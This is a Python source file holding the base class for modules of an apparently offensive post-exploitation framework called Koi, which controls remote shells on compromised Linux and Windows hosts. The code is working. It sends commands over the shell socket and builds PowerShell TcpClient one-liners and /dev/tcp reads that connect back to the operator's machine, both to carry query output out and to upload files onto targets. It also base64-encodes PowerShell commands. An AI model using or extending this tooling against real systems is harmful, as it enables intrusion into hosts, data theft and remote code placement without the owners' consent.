from __future__ import annotations

import base64
import functools
import inspect
import re
import select
import shlex
import time
import uuid
from abc import ABC, abstractmethod
from typing import TYPE_CHECKING, Callable, Iterator, List, Literal, Optional, Union

if TYPE_CHECKING:
    from koi.session import Session

from koi.utils.config import TIMEOUTS
from koi.utils.constants import ANSI_RE, SOCKET_BUFFER_SIZE
from koi.utils.models import CommandResult, StreamLine
from koi.utils import ui
from koi.utils.tcp import (
    TCPReceiveServer,
    get_local_ip,
    spawn_send_server,
)

import argparse

_PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')

# Lines exec_stream holds while learning whether the shell echoes.
_ECHO_PREAMBLE_LINES = 8
_SELECT_TIMEOUT = 0.1


def _owns_io(fn):
    """Hold the session's I/O lock for the whole call.

    Every method touching ``self.session.conn`` needs this, or a concurrent
    reader eats the bytes it waits for and the sentinel never arrives.
    Reentrant, so nesting is free.
    """
    if inspect.isgeneratorfunction(fn):
        @functools.wraps(fn)
        def wrapper(self, *args, **kwargs):
            with self.session.io(holder=f"{self.name}.{fn.__name__}"):
                yield from fn(self, *args, **kwargs)
    else:
        @functools.wraps(fn)
        def wrapper(self, *args, **kwargs):
            with self.session.io(holder=f"{self.name}.{fn.__name__}"):
                return fn(self, *args, **kwargs)
    return wrapper

PlatformSpec = Union[
    Literal["linux", "windows_cmd", "windows_ps", "any"],
    List[Literal["linux", "windows_cmd", "windows_ps"]],
]

class CommandTimeout(Exception):
    def __init__(self, command: str, timeout: float):
        self.command = command
        self.timeout = timeout
        super().__init__(f"Command timed out after {timeout}s: {command}")


class ModuleArgumentError(ValueError):
    """Raised when a module is given arguments argparse refuses."""


class _ModuleParser(argparse.ArgumentParser):
    """argparse that raises instead of printing usage and calling sys.exit."""

    def error(self, message):
        usage = self.format_usage().strip().removeprefix("usage: ")
        raise ModuleArgumentError(f"{message} (usage: {usage})")

    def exit(self, status=0, message=None):
        raise ModuleArgumentError(message.strip() if message else "bad arguments")


class KoiModule(ABC):
    """
    Base class for all Koi modules.

    Quickstart
    ----------
    Create a file in src/koi/modules/ and subclass KoiModule:

        from koi.modules.blueprint import KoiModule

        class MyModule(KoiModule):
            name        = "my_module"
            description = "Does something cool."

            def run(self) -> None:
                result = self.exec("whoami")
                self.ok(f"Running as: {result.stdout.strip()}")
    """

    #: Short identifier used to call the module from the CLI (e.g. "enum_linux")
    name: str = "unnamed_module"

    #: One-line summary shown in the module list
    description: str = "No description provided."

    #: Optional longer help text shown with `module help <name>`
    usage: str = ""

    #: Optional list of argument specifications
    arguments: list[dict] = []

    #: Optional category for grouping modules in the UI
    category: Optional[str] = None

    #: Supported platform(s): "linux", "windows_cmd", "windows_ps", "any",
    #: or a list combining multiple specific targets.
    platform: PlatformSpec = "any"

    #: External resources (URLs) needed by this module, used by --local-prepare
    external_resources: list[dict] = []

    #: Delimiters for rebuilding structured data from a shell's flat text.
    #: MUST stay ASCII: a non-ASCII token does not survive the cp1252 -> UTF-8
    #: round-trip of an upgraded ConPtyShell and collapses every record into one.
    REC_SEP: str = "KOISEP"    # between records of a joined list
    SEC_SEP: str = "KOISEC"    # between top-level sections
    FIELD_SEP: str = "|||"     # between fields of a single record

    @staticmethod
    def _clean(text: str) -> str:
        return ANSI_RE.sub("", text).replace("\r", "").strip()

    @staticmethod
    def _shell_quote(path: str) -> str:
        """Quote *path* for safe insertion into a POSIX shell command."""
        return shlex.quote(path)

    @staticmethod
    def _ps_quote(path: str) -> str:
        """Escape *path* for a single-quoted PowerShell string literal."""
        return path.replace("'", "''")

    @classmethod
    def supports(cls, os_type: Optional[str]) -> bool:
        """Return True if this module is compatible with the given session OS type."""
        if cls.platform == "any":
            return True
        if os_type is None:
            return False
        if isinstance(cls.platform, list):
            return os_type in cls.platform
        return cls.platform == os_type

    @classmethod
    def resolve_external_resources(cls) -> list[dict]:
        """Return the resources ``--local-prepare`` should cache for this module.

        Override when the set is only known at prep time (e.g. always-latest
        releases), keying each entry under the ``cache_key`` run time will look
        up. Only called online, so a network call here is fine.
        """
        return list(cls.external_resources or [])

    def __init__(
        self,
        session: "Session",
        args: Optional[List[str]] = None,
        logger=None,
    ) -> None:
        """
        Parameters
        ----------
        session:
            The active :class:`~koi.main.Session` this module will operate on.
        args:
            Positional arguments passed after the module name on the CLI.
            e.g. ``module run enum_linux -t 30``   args == ["-t", "30"]
        """
        self.session = session
        self.raw_args = args or []
        self.args = self._parse_args()
        self._logger = logger

        # Convenience shortcuts so module authors don't need extra imports
        self.ui = ui
        self.notify = ui.notify
        self.spinner = ui.Spinner
        self.breaker = ui.breaker_with_text
        self.box = ui.print_report_box
        self.table = ui.print_table

    def _parse_args(self):
        if not self.arguments:
            return argparse.Namespace()

        parser = _ModuleParser(prog=self.name, add_help=False)
        for arg in self.arguments:
            arg = arg.copy()
            flags = arg.pop("flags")
            if isinstance(flags, list) and not flags[0].startswith("-"):
                parser.add_argument(flags[0], **arg)
            else:
                parser.add_argument(*flags, **arg)

        try:
            return parser.parse_args(self.raw_args)
        except SystemExit as exc:  # an action bypassing error()/exit()
            raise ModuleArgumentError("bad arguments") from exc

    def _get_local_ip(self) -> str:
        """Return the local IP that routes toward the current session."""
        return get_local_ip(self.session.addr[0])

    @_owns_io
    def _win_query(self, ps_expr: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """Evaluate a PowerShell expression on the target, returning its output.

        Plain sessions read the result back inline via a sentinel marker; an
        upgraded ConPtyShell emits raw VT100, so that path uses a side channel.
        """
        if self.session.upgraded:
            return self._win_query_sidechannel(ps_expr, timeout)

        sentinel = uuid.uuid4().hex
        marker = f"__KOI_{sentinel}__"

        if self.session.os_type == "windows_ps":
            # No outer (): (try{...}catch{...}) is invalid PS syntax.
            cmd = f"{ps_expr}; '{marker}'"
        else:
            # Base64 (UTF-16LE) so the double quotes ps_expr routinely carries
            # cannot collide with cmd.exe's -c "..." and truncate the command.
            inner = f"{ps_expr}; '{marker}'"
            encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
            cmd = f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded}"

        eol = self.session.eol
        enc = self.session.encoding
        self.session.conn.sendall((cmd + eol).encode(enc))

        buf = b""
        deadline = time.monotonic() + timeout
        lines: list[str] = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            r, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not r:
                continue
            chunk = self.session.conn.recv(SOCKET_BUFFER_SIZE)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw, buf = buf.split(b"\n", 1)
                text = raw.decode(enc, errors="replace").strip("\r\n ")
                text = _PS_PROMPT.sub("", text).strip()
                if not text or "Write-Host" in text:
                    continue
                if marker in text:
                    result = lines[-1] if lines else ""
                    if self._logger and result:
                        self._logger.log_event(f"exec  {ps_expr}")
                        self._logger.log_output(result.encode("utf-8", errors="replace"))
                    return result
                lines.append(text)

        # timeout path
        result = lines[-1] if lines else ""
        if self._logger and result:
            self._logger.log_event(f"exec  {ps_expr}")
            self._logger.log_output(result.encode("utf-8", errors="replace"))
        return result

    @_owns_io
    def _win_query_sidechannel(self, ps_expr: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """_win_query for upgraded sessions: PowerShell pushes the result to a
        local socket, bypassing the VT100 stream."""
        local_ip = self._get_local_ip()
        with TCPReceiveServer(timeout=timeout) as srv:
            ps_cmd = (
                f"$_r=({ps_expr})|Out-String;"
                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{srv.port});"
                f"$_s=$_c.GetStream();"
                f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
                f"$_s.Write($_b,0,$_b.Length);"
                f"$_s.Flush();$_c.Close()"
            )
            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
            try:
                raw = srv.collect()
            except (RuntimeError, TimeoutError):
                raw = b""  # a query that never came back is an empty answer
        result = raw.decode("utf-8", errors="replace").strip()
        if self._logger and result:
            self._logger.log_event(f"exec  {ps_expr}")
            self._logger.log_output(result.encode("utf-8", errors="replace"))
        return result

    def _exec_clean(self, cmd: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """Run a Linux command and collect its stdout via delimiter-based capture."""
        token = uuid.uuid4().hex[:16]
        wrapped = f"N={token}; echo S_$N; ({cmd}); echo E_$N:$?"
        result = self.exec(wrapped, timeout=timeout, _silent=True)

        marker_start = f"S_{token}"
        marker_end = f"E_{token}"
        start_idx = result.stdout.find(marker_start)
        end_idx = result.stdout.find(marker_end)
        if start_idx == -1 or end_idx == -1:
            raise ValueError(f"Markers not found in output for command: {cmd}")

        start = result.stdout.find('\n', start_idx) + 1
        clean = result.stdout[start:end_idx].strip()

        if self._logger:
            self._logger.log_event(f"exec  {cmd}")
            if clean:
                self._logger.log_output(clean.encode("utf-8", errors="replace"))
        return clean

    def _try_exec(self, cmd: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """Run a Linux command via the side channel; return empty string on any error."""
        try:
            return self._exec_clean(cmd, timeout=timeout)
        except Exception:
            return ""

    @_owns_io
    def _dispatch_ps(self, ps_cmd: str) -> None:
        """Route a PS command to the session: raw socket for upgraded, sendline otherwise."""
        if self.session.upgraded:
            self.session.send((ps_cmd + "\r\n").encode(self.session.encoding))
            time.sleep(0.3)
            r, _, _ = select.select([self.session.conn], [], [], 1.0)
            if r:
                self.session.conn.recv(SOCKET_BUFFER_SIZE)
        elif self.session.os_type == "windows_ps":
            self.sendline(ps_cmd)
        else:
            escaped = ps_cmd.replace('"', '\\"')
            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')

    @_owns_io
    def _upload_bytes_lin(
        self,
        raw: bytes,
        dest: str,
        timeout: float = TIMEOUTS["upload"],
        on_progress: Optional[Callable[[int], None]] = None,
    ) -> bool:
        """Transfer *raw* bytes to *dest* on a Linux target via /dev/tcp."""
        local_ip = self._get_local_ip()
        quoted = self._shell_quote(dest)
        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
        result = self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {quoted}", timeout=timeout)
        thread.join(timeout=timeout)

        if errors or not result.success:
            return False

        size_str = self._try_exec(f"wc -c < {quoted} 2>/dev/null")
        try:
            return int(size_str.split()[0]) == len(raw)
        except (ValueError, IndexError):
            return False

    @_owns_io
    def _upload_bytes_win(
        self,
        raw: bytes,
        dest: str,
        timeout: float = TIMEOUTS["upload"],
        on_progress: Optional[Callable[[int], None]] = None,
    ) -> bool:
        """Transfer *raw* bytes to *dest* on a Windows target via a PS TCP client.

        Verified against the on-target file size, so a silent write failure
        (access denied, AV removal, full disk) is not reported as success.
        """
        local_ip = self._get_local_ip()
        ps_dest = self._ps_quote(dest)
        resolved = (
            "$ExecutionContext.SessionState.Path."
            f"GetUnresolvedProviderPathFromPSPath('{ps_dest}')"
        )
        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
        ps_cmd = (
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_f=[IO.File]::OpenWrite({resolved});"
            f"$_b=New-Object byte[] 65536;"
            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
            f"$_f.Close();$_c.Close()"
        )
        self._dispatch_ps(ps_cmd)
        thread.join(timeout=timeout)

        if errors:
            return False

        size_str = self._win_query(
            f"(Get-Item -LiteralPath ({resolved}) -EA SilentlyContinue).Length",
            timeout=timeout,
        )
        try:
            return int(size_str.strip()) == len(raw)
        except (ValueError, AttributeError):
            return False

    def _upload_bytes(
        self,
        raw: bytes,
        dest: str,
        timeout: float = TIMEOUTS["upload"],
        on_progress: Optional[Callable[[int], None]] = None,
    ) -> bool:
        """Transfer *raw* bytes to *dest*, dispatching to the right platform."""
        if self.session.os_type == "linux":
            return self._upload_bytes_lin(raw, dest, timeout, on_progress)
        return self._upload_bytes_win(raw, dest, timeout, on_progress)

    def run_module(self, io_timeout: Optional[float] = None) -> None:
        """Run the module while owning the session socket throughout.

        Held across the whole run, not per ``exec()``: a module's intermediate
        state matters. ``io_timeout=None`` waits indefinitely.
        """
        with self.session.io(holder=f"module:{self.name}", timeout=io_timeout):
            if self._logger:
                self._logger.log_event(f"module_start  {self.name}")
            try:
                self.run()
            finally:
                if self._logger:
                    self._logger.log_event(f"module_end  {self.name}")

    @abstractmethod
    def run(self) -> None:
        """
        Entry point for the module.  All business logic goes here.

        Available helpers
        -----------------
        self.exec(cmd)        -> CommandResult  (blocking, raises on timeout)
        self.exec_stream(cmd) -> Iterator[StreamLine]
        self.send(data)       -> bool  (raw bytes to the socket)
        self.notify(type, msg)
        self.spinner(msg)     -> context manager
        self.box(title, dict)
        self.breaker()
        self.session          -> Session dataclass (id, conn, addr, upgraded, ...)
        self.args             -> list[str] from the CLI
        """
    def _read_lines(self, command: str, timeout: float) -> Iterator[str]:
        """Yield decoded lines from the session socket until the peer goes quiet.

        The transport half of the sentinel protocol; keep exec() and
        exec_stream() on this one reader so they cannot drift. Raises
        :class:`CommandTimeout`, returns when the socket closes.
        """
        buf = b""
        deadline = time.monotonic() + timeout

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise CommandTimeout(command, timeout)

            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not ready:
                continue

            chunk = self.session.conn.recv(SOCKET_BUFFER_SIZE)
            if not chunk:
                return

            buf += chunk
            while b"\n" in buf:
                raw_line, buf = buf.split(b"\n", 1)
                yield raw_line.decode("utf-8", errors="replace").strip("\r")

    @_owns_io
    def exec(self, command: str, timeout: float = TIMEOUTS["exec_command"], _silent: bool = False):
        marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
        # A PTY echoes the wrapper back, so a line merely *containing* the marker
        # is that echo. Anchor on the numeric exit code to tell them apart.
        done_re = re.compile(rf"^{re.escape(marker)}:(-?\d+)$")
        wrapped = f'( {command} ); _rc=$?; printf "\\n{marker}:$_rc\\n"\n'
        self.session.conn.sendall(wrapped.encode("utf-8"))

        started = time.monotonic()
        output_lines: List[str] = []
        returncode = 1  # the socket closing mid-command is a failure

        for text in self._read_lines(command, timeout):
            if match := done_re.match(text):
                returncode = int(match.group(1))
                break
            if marker in text:
                # The echo: everything up to it is prompt and command noise.
                output_lines.clear()
                continue
            output_lines.append(text)

        output = "\n".join(output_lines)
        if self._logger and not _silent:
            self._logger.log_event(f"exec  {command}")
            if output:
                self._logger.log_output(output.encode("utf-8", errors="replace"))
        return CommandResult(
            command=command,
            returncode=returncode,
            stdout=output,
            duration=time.monotonic() - started,
        )

    @_owns_io
    def exec_stream(self, command: str, timeout: float = TIMEOUTS["exec_command"]):
        """Stream *command* output line by line as :class:`StreamLine` objects::

            for line in self.exec_stream("find / -name '*.conf' 2>/dev/null"):
                self.notify('info', line.text)
        """
        marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
        wrapped = f'( {command} ); printf "\\n{marker}\\n"\n'
        self.session.conn.sendall(wrapped.encode("utf-8"))

        # Unlike exec(), this cannot drop the preamble after the fact, so
        # opening lines are held until the echo marks them as noise. A
        # non-echoing shell never sends one, hence the cap.
        pending: List[str] = []
        holding = True

        for text in self._read_lines(command, timeout):
            if text == marker:
                break
            if marker in text:
                pending.clear()
                holding = False
                continue

            pending.append(text)
            if holding:
                if len(pending) < _ECHO_PREAMBLE_LINES:
                    continue
                holding = False

            for held in pending:
                yield StreamLine(text=held)
            pending.clear()

        # Still held at the end means never identified as noise, so it is output.
        for held in pending:
            yield StreamLine(text=held)

    def send(self, data: bytes) -> bool:
        """Write raw bytes to the socket; False if the session is dead."""
        return self.session.send(data)

    def sendline(self, line: str, encoding: str = "utf-8") -> bool:
        """Convenience wrapper: encode *line* + newline and send it."""
        return self.send((line + "\n").encode(encoding))

    def ok(self, msg: str) -> None:
        """Print a success-style info notification."""
        self.notify("info", msg)

    def err(self, msg: str) -> None:
        """Print an error notification."""
        self.notify("error", msg)

    def warn(self, msg: str) -> None:
        """Print a warning notification."""
        self.notify("warning", msg)

    def status(self, msg: str) -> None:
        """Print a status notification."""
        self.notify("status", msg)
        
    def success(self, msg: str) -> None:
        """Print a success notification."""
        self.notify("success", msg)

    def __str__(self) -> str:
        return f"<KoiModule {self.name!r} on session #{self.session.id}>"

    def __repr__(self) -> str:
        return self.__str__()